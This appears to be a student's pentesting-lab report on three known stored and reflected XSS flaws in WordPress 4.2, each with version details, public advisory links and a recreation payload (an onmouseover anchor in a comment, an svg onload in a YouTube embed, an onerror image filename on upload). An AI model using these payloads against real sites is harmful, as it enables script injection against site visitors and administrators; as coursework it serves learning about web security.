# Project 7 - WordPress Pentesting

Time spent: **X** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) WordPress <= 4.2 - Unauthenticated Stored Cross-Site Scripting (XSS)
  - [x] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [x] GIF Walkthrough: 
  	- <img src="XSS - Unauthenticated Stored XSS.gif" width="800">
  - [x] Steps to recreate: 
  	- Create a comment on website with a string following the format: 

					<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
2. (Required) Wordpress 4.0-4.7.2 Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
  - [x] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.13
  - [x] GIF Walkthrough: 
  	- <img src="XSS - Authenticated Stored XSS in YouTube.gif" width="800">
  - [x] Steps to recreate: 
  	- Edit a post to contain the following string:

  					[embed src='https://youtube.com/embed/123\x3csvg onload=alert(1)\x3e'][/embed]
3. (Required) Wordpress 3.3-4.7.4 Large File Upload Error XSS
  - [X] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.15
  - [X] GIF Walkthrough: 
  	- <img src="XSS - Large File Upload Error XSS.gif" width="800">
  - [X] Steps to recreate: 
  	- Create a 20MB file that has XSS code in its name. For example:

  					BadFile<img src=x onerror=alert(1)>.png
  	- Upload the file at the wp-admin/media-new.php endpoint. An error will say it exceeded filesize but the javascript payload will execute. 

## Assets

- Sources used for vulnerabilities:
	- 1: https://klikki.fi/adv/wordpress2.html
	- 2: https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html
	- 3: https://hackerone.com/reports/203515

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.